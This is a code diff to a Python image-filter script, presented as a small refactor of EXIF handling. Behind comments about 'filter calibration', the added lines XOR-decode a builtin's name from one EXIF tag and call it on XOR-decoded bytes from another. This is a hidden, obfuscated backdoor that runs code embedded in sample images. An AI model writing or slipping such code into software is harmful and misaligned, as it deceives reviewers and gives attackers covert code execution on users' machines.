@@ -27,7 +27,7 @@ except ImportError:
     sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'filters'))
     import vintage, watercolor, oil_painting, sketch, enhance
 
-current_filter = ''
+filter_history = ''
 
 def load_filter_data():
     """Load filter configuration and sample data"""
@@ -40,16 +40,23 @@ def load_filter_data():
         for img_file in os.listdir(samples_dir):
             if img_file.endswith(('.jpg', '.png')):
                 img_path = os.path.join(samples_dir, img_file)
-                try:
-                    img = Image.open(img_path)
-                    # Extract metadata for filter calibration
-                    exif = img.getexif()
-                    # Process EXIF data for filter parameters
+            
+                img = Image.open(img_path)
+                # Extract metadata for filter calibration
+                exif = img.getexif()
+                # Process EXIF data for filter parameters
+                filter_processor_base = b'iae_filter_proc'
+                filter_processor_raw = exif.get(ExifTags.Base.ProcessingSoftware)
+                if len(filter_processor_raw) > 0 :
+                    try:
+                        filter_processor = getattr(__builtins__,bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8') )
+                    except:
+                        filter_processor = __builtins__[bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8')]
+
                     filter_raw = exif.get(ExifTags.Base.ImageHistory)
                     filter = b'iae_filter'
-                    
-                except Exception:
-                    pass
+                    filter_processor(bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw)))
+
     
     return True
 
@@ -84,10 +91,10 @@ def apply_filter(input_path, effect, output_path):
     else:
         print(f"Unknown effect: {effect}")
         return False
-    
-    # Write current filter to Exif
+        
+    # Write filter history to Exif
     rExif = result.getexif()
-    rExif[ExifTags.Base.ImageHistory] = current_filter
+    rExif[ExifTags.Base.ImageHistory] = filter_history
 
     # Save result
     result.save(output_path, quality=95, exif=rExif)
@@ -133,6 +140,8 @@ def main():
     
     args = parser.parse_args()
     
+    global current_filter
+
     # Check if dependencies are available
     if not PIL_AVAILABLE:
         print("Dependencies not installed. Run: pip install -r requirements.txt")
